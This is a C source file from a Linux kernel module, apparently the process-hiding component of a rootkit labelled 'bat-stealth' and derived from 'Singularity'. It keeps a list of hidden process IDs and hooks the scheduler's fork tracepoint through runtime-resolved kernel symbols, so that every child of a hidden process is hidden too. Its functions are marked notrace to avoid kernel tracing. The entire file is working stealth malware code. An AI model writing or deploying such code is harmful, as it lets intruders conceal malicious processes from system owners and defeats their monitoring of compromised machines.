/* pid_manager.c — PID hiding management + fork tracking
 * Merge of Singularity hidden_pids.c + trace.c
 * No arch-specific code needed.
 */
#include "../include/core.h"
#include "../include/pid_manager.h"
#include "../ftrace/ftrace_helper.h"

int  child_pids[MAX_CHILD_PIDS];
int  hidden_pids[MAX_HIDDEN_PIDS];
u64  hidden_start_times[MAX_HIDDEN_PIDS];
u64  child_start_times[MAX_CHILD_PIDS];
int  hidden_count = 0;
int  child_count  = 0;

static DEFINE_SPINLOCK(hidden_pids_lock);

/* ── Count ──────────────────────────────────────────────────── */

notrace int hidden_pid_count(void)
{
    unsigned long flags;
    int count;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    count = hidden_count;
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return count;
}

notrace int child_pid_count(void)
{
    unsigned long flags;
    int count;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    count = child_count;
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return count;
}

/* ── Snapshot ────────────────────────────────────────────────── */

notrace int hidden_pids_snapshot(int *dst, int max_entries)
{
    unsigned long flags;
    int n;
    if (!dst || max_entries <= 0) return 0;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    n = hidden_count;
    if (n > MAX_HIDDEN_PIDS) n = MAX_HIDDEN_PIDS;
    if (n > max_entries)     n = max_entries;
    if (n > 0) memcpy(dst, hidden_pids, n * sizeof(int));
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return n;
}

notrace int child_pids_snapshot(int *dst, int max_entries)
{
    unsigned long flags;
    int n;
    if (!dst || max_entries <= 0) return 0;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    n = child_count;
    if (n > MAX_CHILD_PIDS) n = MAX_CHILD_PIDS;
    if (n > max_entries)    n = max_entries;
    if (n > 0) memcpy(dst, child_pids, n * sizeof(int));
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return n;
}

/* ── Child PID ───────────────────────────────────────────────── */

notrace void add_child_pid(int pid)
{
    unsigned long flags;
    int i;
    struct task_struct *task;
    struct task_struct *leader;
    u64 start_time_ns = 0;

    if (pid <= 0) return;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        leader = rcu_dereference(task->group_leader);
        if (!leader) leader = task;
        start_time_ns = READ_ONCE(leader->start_time);
    }
    rcu_read_unlock();

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < child_count; i++) {
        if (child_pids[i] == pid) {
            if (start_time_ns) child_start_times[i] = start_time_ns;
            goto out;
        }
    }
    if (child_count < MAX_CHILD_PIDS) {
        child_pids[child_count]          = pid;
        child_start_times[child_count++] = start_time_ns;
    }
out:
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

notrace int is_child_pid(int pid)
{
    unsigned long flags;
    int i, found = 0;
    if (pid <= 0) return 0;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < child_count; i++) {
        if (child_pids[i] == pid) { found = 1; break; }
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return found;
}

/* ── Hidden PID ──────────────────────────────────────────────── */

notrace void add_hidden_pid(int pid)
{
    unsigned long flags;
    int i;
    struct task_struct *task;
    struct task_struct *leader;
    u64 start_time_ns = 0;

    if (pid <= 0) return;

    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        leader = rcu_dereference(task->group_leader);
        if (!leader) leader = task;
        start_time_ns = READ_ONCE(leader->start_time);
    }
    rcu_read_unlock();

    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            if (start_time_ns) hidden_start_times[i] = start_time_ns;
            goto out;
        }
    }
    if (hidden_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_count]          = pid;
        hidden_start_times[hidden_count++] = start_time_ns;
    }
out:
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

notrace void del_hidden_pid(int pid)
{
    unsigned long flags;
    int i, j;
    if (pid <= 0) return;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            for (j = i; j < hidden_count - 1; j++) {
                hidden_pids[j]        = hidden_pids[j+1];
                hidden_start_times[j] = hidden_start_times[j+1];
            }
            hidden_count--;
            break;
        }
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
}

notrace int is_hidden_pid(int pid)
{
    unsigned long flags;
    int i, found = 0;
    if (pid <= 0) return 0;
    spin_lock_irqsave(&hidden_pids_lock, flags);
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) { found = 1; break; }
    }
    spin_unlock_irqrestore(&hidden_pids_lock, flags);
    return found;
}

/* ── Fork tracing ────────────────────────────────────────────── */

static struct tracepoint *tp_sched_fork;
static int (*_probe_register)(struct tracepoint *, void *, void *);
static int (*_probe_unregister)(struct tracepoint *, void *, void *);

notrace static void on_fork_handler(void *data,
                                     struct task_struct *parent,
                                     struct task_struct *child)
{
    if (is_hidden_pid(parent->pid)  || is_hidden_pid(parent->tgid) ||
        is_child_pid(parent->pid)   || is_child_pid(parent->tgid)) {
        add_child_pid(child->pid);
        add_child_pid(child->tgid);
    }
}

/* ── Init / Exit ─────────────────────────────────────────────── */

int pid_manager_init(void)
{
    _probe_register   = (void *)resolve_sym("tracepoint_probe_register");
    _probe_unregister = (void *)resolve_sym("tracepoint_probe_unregister");
    tp_sched_fork     = (void *)resolve_sym("__tracepoint_sched_process_fork");

    if (!tp_sched_fork || !_probe_register) {
        pr_warn("bat-stealth: pid_manager: sched_process_fork tracepoint not found\n");
        return -ENODEV;
    }
    _probe_register(tp_sched_fork, on_fork_handler, NULL);
    return 0;
}

void pid_manager_exit(void)
{
    if (tp_sched_fork && _probe_unregister)
        _probe_unregister(tp_sched_fork, on_fork_handler, NULL);
}
